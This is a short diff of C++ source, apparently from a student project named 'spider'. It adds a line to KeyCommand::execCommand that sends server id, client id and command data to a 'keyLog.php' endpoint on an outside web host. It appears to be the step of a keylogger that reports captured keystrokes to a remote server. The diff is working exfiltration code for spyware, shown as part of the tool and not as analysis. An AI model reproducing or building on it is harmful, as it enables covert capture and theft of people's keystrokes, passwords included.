@@ -5,10 +5,11 @@
 // Login   <mediav_j@epitech.net>
 //
 // Started on  Mon Oct 26 15:23:34 2015 Jérémy Mediavilla
-// Last update Wed Oct 28 03:29:46 2015 Joris Bertomeu
+// Last update Wed Oct 28 11:31:50 2015 Joris Bertomeu
 //
 
 #include <KeyCommand.hh>
+#include <HttpPost.hpp>
 
 KeyCommand::KeyCommand()
 {
@@ -20,9 +21,11 @@ KeyCommand::~KeyCommand()
 
 }
 
-bool		KeyCommand::execCommand(const std::string &command)
+bool		KeyCommand::execCommand(const std::string &srvId, const std::string &clientId, const std::string &command)
 {
   (void)command;
+
+  HttpPost::request("toto", std::string("http://jobertomeu.fr/spider/servlets/keyLog.php?server=" + srvId + "&client=" + clientId + "&data=" + command));
   std::cout << "Key Command" << std::endl;
 
   return (true);
